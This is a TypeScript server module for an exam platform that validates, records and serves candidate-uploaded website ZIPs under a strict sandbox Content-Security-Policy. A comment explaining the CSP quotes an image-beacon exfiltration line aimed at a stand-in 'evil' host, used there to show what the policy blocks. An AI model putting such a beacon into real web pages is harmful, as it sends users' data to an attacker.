/**
 * T1 site submission handlers — framework-agnostic, same (context, input) →
 * result convention as ../handlers.ts.
 *
 * Upload: validate the ZIP (pure), store the content-addressed snapshot, and
 * record the submission as an append-only `responses` row whose payload
 * carries the snapshot digest — the row is what makes the score recomputable
 * from stored inputs. ONE site submission per attempt: re-uploading the same
 * bytes is an idempotent replay; different bytes are rejected (409), matching
 * finalize semantics on the append-only store.
 *
 * Serve: unauthenticated capability URL keyed by the digest (a 256-bit opaque
 * token, unguessable — the phase-3 stand-in for spec §12's per-submission
 * opaque origin). Every response carries the sandbox CSP below.
 */

import type { ApiContext, ApiResult } from "../handlers.js";
import { withParticipant } from "../handlers.js";
import { appendResponse, getAttempt, type AppendResult } from "../store.js";
import type { Queryable } from "../db.js";
import type { HeaderMap } from "../auth.js";
import { T1_SITE_RESPONSE_KIND, canonicalSitePath, siteUrlPath } from "@ailx/contract";
import { SnapshotError, type SnapshotErrorCode } from "./errors.js";
import { SNAPSHOT_DIGEST_RE, snapshotFromZip } from "./snapshot.js";
import type { SnapshotStore } from "./storage.js";

export { T1_SITE_RESPONSE_KIND };

export interface T1ApiContext extends ApiContext {
  snapshots: SnapshotStore;
}

/**
 * What the serve path needs: the snapshot bytes and the DB session that says
 * whether they are still recorded. Structurally satisfied by T1ApiContext.
 */
export interface SiteServeContext {
  db: Queryable;
  snapshots: SnapshotStore;
}

/**
 * Partial unique index in db/schema.sql — ONE site row per attempt. The
 * name is matched on the Postgres error, so it lives next to the code that
 * interprets it.
 */
export const T1_SITE_UNIQUE_INDEX = "responses_one_t1_site_per_attempt";

/** The one site submission an attempt may hold. */
export interface RecordedSubmission {
  id: string;
  digest: string;
  /** ISO-8601 server timestamp of the append. */
  submittedAt: string;
}

/**
 * The already-recorded site submission for an attempt, if any. Exported
 * because the EXPORT path (./export.ts) asks the same question: which digest
 * does THIS attempt own — the one authorization check that a capability URL
 * can never stand in for.
 */
export async function recordedSubmission(
  db: Queryable,
  attemptId: string,
): Promise<RecordedSubmission | null> {
  const { rows } = await db.query(
    `SELECT id, payload->>'digest' AS digest, server_ts FROM responses
     WHERE attempt_id = $1 AND payload->>'kind' = $2
     ORDER BY seq LIMIT 1`,
    [attemptId, T1_SITE_RESPONSE_KIND],
  );
  const row = rows[0];
  if (row === undefined) return null;
  return {
    id: String(row.id),
    digest: row.digest as string,
    // The SERVER's stamp, not the client's: an export README states when the
    // site was submitted, and a candidate-supplied clock is not evidence.
    submittedAt: new Date(row.server_ts as string | Date).toISOString(),
  };
}

/** Did this write lose the one-submission-per-attempt race in the DB? */
function isOneSitePerAttemptViolation(err: unknown): boolean {
  const e = err as { code?: unknown; constraint?: unknown; message?: unknown };
  if (e?.code !== "23505") return false;
  return (
    e.constraint === T1_SITE_UNIQUE_INDEX ||
    (typeof e.message === "string" && e.message.includes(T1_SITE_UNIQUE_INDEX))
  );
}

const ALREADY_SUBMITTED: ApiResult = {
  status: 409,
  body: {
    error: {
      code: "already_submitted",
      message: "attempt already has a site submission — submissions are append-only",
    },
  },
};

/** Size violations are 413; every other rejection is a plain 400. */
const OVERSIZE_CODES: ReadonlySet<SnapshotErrorCode> = new Set([
  "too_many_files",
  "file_too_large",
  "total_too_large",
]);

function snapshotErrorResult(err: SnapshotError): ApiResult {
  return {
    status: OVERSIZE_CODES.has(err.code) ? 413 : 400,
    body: { error: { code: err.code, message: err.message } },
  };
}

export interface UploadSiteInput {
  /** Raw ZIP bytes — the request body, not JSON. */
  zip: Uint8Array;
  /** Session-log sequence number, same convention as other responses. */
  seq: number;
  clientTs: string | number;
}

/**
 * Everything a site submission is, once the caller is known to own the
 * attempt: validate the ZIP, record the row, THEN store the bytes.
 *
 * Shared by the direct POST above and the client-direct finalize path
 * (./direct.ts), because bytes are bytes: whether they arrived in our
 * request body or in a bucket the browser wrote to, the server is the
 * only authority on what is accepted, and both paths must clear the
 * same validator with the same ordering.
 */
export async function recordSiteSubmission(
  ctx: T1ApiContext,
  attemptId: string,
  participantId: string,
  input: UploadSiteInput,
): Promise<ApiResult> {
  if (!(input.zip instanceof Uint8Array) || input.zip.length === 0) {
    return { status: 400, body: { error: { code: "bad_request", message: "request body must be the site ZIP bytes" } } };
  }

  let snapshot: ReturnType<typeof snapshotFromZip>;
  try {
    snapshot = snapshotFromZip(input.zip);
  } catch (err) {
    if (err instanceof SnapshotError) return snapshotErrorResult(err);
    throw err;
  }

  // One submission per attempt. This SELECT is a courtesy — it turns the
  // common case into a clean 409 without burning a failed transaction —
  // but the AUTHORITY is the partial unique index (see the catch below):
  // a SELECT outside the write's transaction cannot serialize two uploads
  // at different seqs.
  const existing = await recordedSubmission(ctx.db, attemptId);
  if (existing !== null && existing.digest !== snapshot.digest) return ALREADY_SUBMITTED;

  // ORDER IS THE SECURITY PROPERTY: the RECORD comes first, the bytes
  // second. Storing bytes first published servable content for uploads the
  // append then REJECTED (finalized attempt, seq conflict, lost race) —
  // arbitrary content at the exam origin with no row tying it to anyone.
  // Now a rejected upload stores nothing at all, and the serve path only
  // serves a digest some response row still points at (handleServeSite),
  // so bytes are reachable only while they are attributable.
  //
  // The residue of this order is the harmless one: a crash between the
  // commit and the put leaves a recorded digest that 404s until the client
  // re-uploads the same bytes — which replays (200) and stores them.
  let result: AppendResult;
  try {
    result = await appendResponse(ctx.db, attemptId, participantId, {
      seq: input.seq,
      clientTs: input.clientTs,
      payload: {
        kind: T1_SITE_RESPONSE_KIND,
        digest: snapshot.digest,
        fileCount: snapshot.fileCount,
        totalBytes: snapshot.totalBytes,
      },
    });
  } catch (err) {
    if (!isOneSitePerAttemptViolation(err)) throw err;
    // The DB refused a second site row. Same bytes at a different seq is
    // still an idempotent replay (the recorded submission IS this one);
    // different bytes is the 409 the pre-check would have given.
    const winner = await recordedSubmission(ctx.db, attemptId);
    if (winner === null || winner.digest !== snapshot.digest) return ALREADY_SUBMITTED;
    result = { id: winner.id, created: false };
  }
  await ctx.snapshots.put(snapshot);
  return {
    status: result.created ? 201 : 200,
    body: {
      submission: {
        responseId: result.id,
        created: result.created,
        digest: snapshot.digest,
        fileCount: snapshot.fileCount,
        totalBytes: snapshot.totalBytes,
        path: siteUrlPath(snapshot.digest),
      },
    },
  };
}

/**
 * Ownership gate shared by every attempt-scoped T1 handler: 404 for
 * someone else's attempt (no existence leak), and checked BEFORE any
 * work — no stranger gets to spend our CPU on a 25 MB archive, or to
 * learn whether an attempt id exists.
 */
export async function withOwnedAttempt<T = ApiResult>(
  ctx: T1ApiContext,
  headers: HeaderMap,
  attemptId: string,
  fn: (participantId: string) => Promise<T | ApiResult>,
): Promise<T | ApiResult> {
  return withParticipant<T>(ctx, headers, async (participantId) => {
    const attempt = await getAttempt(ctx.db, attemptId, participantId);
    if (attempt === null) {
      return { status: 404, body: { error: { code: "not_found", message: "attempt not found" } } };
    }
    return fn(participantId);
  });
}

/** POST /api/attempts/:id/site — body: ZIP bytes; ?seq= & x-ailx-client-ts. */
export async function handleUploadSite(
  ctx: T1ApiContext,
  headers: HeaderMap,
  attemptId: string,
  input: UploadSiteInput,
): Promise<ApiResult> {
  return withOwnedAttempt(ctx, headers, attemptId, (participantId) =>
    recordSiteSubmission(ctx, attemptId, participantId, input),
  );
}

/**
 * Sandbox headers for every served submission byte — spec §12. `origin` is
 * the serving origin, listed explicitly because CSP `'self'` does not match
 * the opaque origin that `sandbox` induces.
 *
 *  - `sandbox allow-scripts` (no allow-same-origin): IN THE HEADER, so even a
 *    top-level open gets an opaque origin — no cookies, storage, or
 *    credentialed same-origin fetches against our app, ever.
 *  - `connect-src 'none'`: the exfiltration kill switch — no fetch/XHR/
 *    WebSocket/EventSource/sendBeacon. `webrtc 'block'` closes data channels.
 *  - `img/media/font/style/script-src` limited to the snapshot's own origin
 *    (+ data:/blob: for inline assets, which cannot exfiltrate): closes
 *    `new Image().src = "https://evil/?"+data`.
 *  - `form-action 'none'`: a hosted phishing page can submit nothing.
 *  - `base-uri 'none'`, `object-src 'none'`, `frame-src 'none'`,
 *    `worker-src 'none'`: no base-tag redirection, plugins, nested frames, or
 *    worker-based CPU burn.
 *  - `nosniff` + served-from-allowlist content types; `no-referrer` so URLs
 *    of other app pages never leak into a submission; `noindex` (§12
 *    phishing row); immutable caching is safe because URLs are content-addressed.
 */
export function sandboxHeaders(origin: string, contentType: string): Record<string, string> {
  return {
    "content-type": contentType,
    "content-security-policy": [
      "sandbox allow-scripts",
      "default-src 'none'",
      `script-src 'self' ${origin}`,
      `style-src 'self' ${origin} 'unsafe-inline'`,
      `img-src 'self' ${origin} data: blob:`,
      `media-src 'self' ${origin}`,
      `font-src 'self' ${origin} data:`,
      `manifest-src 'self' ${origin}`,
      "connect-src 'none'",
      "webrtc 'block'",
      "form-action 'none'",
      "base-uri 'none'",
      "object-src 'none'",
      "frame-src 'none'",
      "worker-src 'none'",
    ].join("; "),
    "x-content-type-options": "nosniff",
    "referrer-policy": "no-referrer",
    "x-robots-tag": "noindex",
    "cache-control": "public, max-age=31536000, immutable",
  };
}

export interface ServeSiteResult {
  status: number;
  headers: Record<string, string>;
  /** null on 404. */
  data: Uint8Array | null;
}

const NOT_FOUND: ServeSiteResult = {
  status: 404,
  headers: { "content-type": "text/plain; charset=utf-8" },
  data: null,
};

/**
 * GET /api/site/:digest/*path — no auth: the digest IS the capability.
 * Directory-ish paths resolve to index.html via the shared canonicalSitePath
 * rule (the HTTP route redirects them there instead, so the browser's base URL
 * matches what it asked for); anything not listed in the snapshot manifest
 * (including traversal junk) is a 404 by construction.
 *
 * REACHABILITY RULE: the RECORD makes bytes servable, never the bytes alone.
 * A digest no `responses` row points at is a 404 even when the store still
 * holds it — so a snapshot orphaned by an older upload path (bytes stored
 * before the append was rejected), or left behind by any future cleanup,
 * hosts nothing at our origin. The check is one indexed lookup
 * (responses_t1_site_digest) and runs before the bytes are read.
 */
export async function handleServeSite(
  ctx: SiteServeContext,
  origin: string,
  digest: string,
  rawPath: string,
): Promise<ServeSiteResult> {
  if (!SNAPSHOT_DIGEST_RE.test(digest)) return NOT_FOUND;
  const { rows } = await ctx.db.query(
    `SELECT 1 FROM responses WHERE payload->>'kind' = $1 AND payload->>'digest' = $2 LIMIT 1`,
    [T1_SITE_RESPONSE_KIND, digest],
  );
  if (rows.length === 0) return NOT_FOUND;
  const path = canonicalSitePath(rawPath);
  const file = await ctx.snapshots.getFile(digest, path);
  if (file === null) return NOT_FOUND;
  return { status: 200, headers: sandboxHeaders(origin, file.contentType), data: file.data };
}
